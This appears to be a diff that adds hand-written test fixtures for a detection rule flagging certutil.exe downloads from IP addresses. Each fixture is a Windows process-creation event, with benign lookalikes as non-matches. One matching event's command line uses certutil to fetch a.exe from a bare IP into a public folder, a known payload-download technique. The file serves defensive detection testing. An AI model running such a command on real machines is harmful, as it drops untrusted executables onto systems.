@@ -1,0 +1,12 @@
+# Hand-written fixtures (the converter does not generate them); values are invented.
+match:
+  - desc: "certutil fetches a payload from an IP address"
+    events:
+      - {"name": "CreateProcess", "platform": "windows", "proc": {"pid": 6228, "ppid": 4000, "exe": "C:\\Windows\\System32\\certutil.exe", "name": "certutil.exe", "uid": -1, "euid": -1, "username": "CORP\\alice", "cmdline": "certutil.exe -urlcache -split -f http://198.51.100.7/a.exe C:\\Users\\Public\\a.exe", "original_name": "CertUtil.exe", "parent": {"pid": 4000, "exe": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}}
+nomatch:
+  - desc: "benign lookalike - certutil download from a domain"
+    events:
+      - {"name": "CreateProcess", "platform": "windows", "proc": {"pid": 6240, "ppid": 4000, "exe": "C:\\Windows\\System32\\certutil.exe", "name": "certutil.exe", "uid": -1, "euid": -1, "username": "CORP\\alice", "cmdline": "certutil.exe -urlcache -f https://pki.example/root.crl root.crl", "original_name": "CertUtil.exe", "parent": {"pid": 4000, "exe": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}}
+  - desc: "certutil hashes a file"
+    events:
+      - {"name": "CreateProcess", "platform": "windows", "proc": {"pid": 6241, "ppid": 4000, "exe": "C:\\Windows\\System32\\certutil.exe", "name": "certutil.exe", "uid": -1, "euid": -1, "username": "CORP\\alice", "cmdline": "certutil.exe -hashfile C:\\setup.exe SHA256", "original_name": "CertUtil.exe", "parent": {"pid": 4000, "exe": "C:\\Windows\\System32\\cmd.exe", "name": "cmd.exe"}}}
